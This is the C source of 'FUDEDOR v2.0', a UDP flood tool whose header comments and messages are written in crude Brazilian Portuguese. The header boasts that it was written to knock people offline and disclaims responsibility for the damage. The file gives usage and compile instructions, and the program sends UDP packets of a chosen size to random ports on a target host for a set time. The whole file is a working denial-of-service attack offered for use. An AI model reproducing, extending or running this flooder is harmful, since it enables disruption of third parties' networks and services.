/**** * * * * *
**
** FUDEDOR (v2.0) - simple udp flooder by Bonny.
**
** OBS: criei essa merda so pra fuder os pela saco,
** essa merda nao spoofa ip, entao se vira!
**
** ATENCAO: NAO ME RESPONSABILIZO PELA FUDECAO CAUSADA!
** 
** brasirc: #fewk, #coders, #hacker, #hackers
** dalnet: #unixos roots@dalnet, dumped, rodolfo
** bonny@unix.com.br
**
** gcc fudedor2.c -o fudedor2
** ./fudedor2 ip size times
** i like this..tipo...
** ./fudedor2 ip 500 500
** instala em alguma shell
******/

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/udp.h>

 char *program;

usage() {

	printf("\nUSO: %s <host> <size> <time>\n\n", program);
	printf("   <host> == host do babaca a ser fudido\n");
	printf("   <size> == bytes a serem enviados\n");
	printf("   <time> == tempo da fudecao\n");
	printf("\nESSA PORRA NAO SPOOFA IP, EU NAO SEI FAZER ISSO =)\n\n");
	exit(0);

}

main(int argc, char *argv[]) {

	int sock, host, pacote;

	int timer = 0;
	int start = 0;
	int end = 0;

	struct sockaddr_in sin;
	struct hostent *he;

	void *buf;

	void ctrlc (int ignored) {
	   printf("PRONTO, ELE FOI FUDIDO (ctrl-c pra cancelar)\n\n");
	   exit(0);
	}

	signal(SIGINT, ctrlc);

	program = argv[0];

	printf("\nFUDEDOR2.C (v2.0) by Bonny - PRIVATE!@#!\n");

	if (argc != 4) {
	   usage();
	}

	if (atoi(argv[2]) < 1) {
	   usage();
	}

	if (atoi(argv[3]) < 1) {
	   usage();
	}

	if ((he = gethostbyname(argv[1])) == NULL) {
	   printf("\nUnknown host: %s\n\n", argv[1]);
	   exit(0);
	}

	host = inet_addr(argv[1]);

/* 

  0 byte = 28 ...
  size = 500 ... (500 + 28) ...
  result = 528 ... (528 - 28) ...
  result2 = 500! :)

*/

	pacote = atoi(argv[2]) - 28;

	if (pacote < 28) {
	   pacote = 0;
	}

	if (atoi(argv[2]) > 65535) {
	   printf("\nMaximo de bytes permitodos: 65535.\n\n");
	   exit(0);
	}

	buf = 0;

	if (!(buf = malloc(pacote))) {
	   printf("\nVoce nao tem memoria suficiente seu merda.\n\n");
	   exit(0);
	}

	sin.sin_family = AF_INET;
	bcopy(he -> h_addr, (char *) &sin.sin_addr, he -> h_length);
         
	 sock = socket(AF_INET, SOCK_DGRAM, 17);
	printf("\nFUDENDO A VERA %s COM %s bytes...\n", argv[1], argv[2]);
  
	timer = atoi(argv[3]);
	start = time(NULL);
	end = start + timer;

	while (time(NULL) < end) {
           sin.sin_port = htons(rand() % 65535);
	   sendto(sock, buf, pacote, 0, (struct sockaddr *) &sin, sizeof(sin));

	}

	printf("Pronto maneh, o babaca foi fudido!\n\n");

}
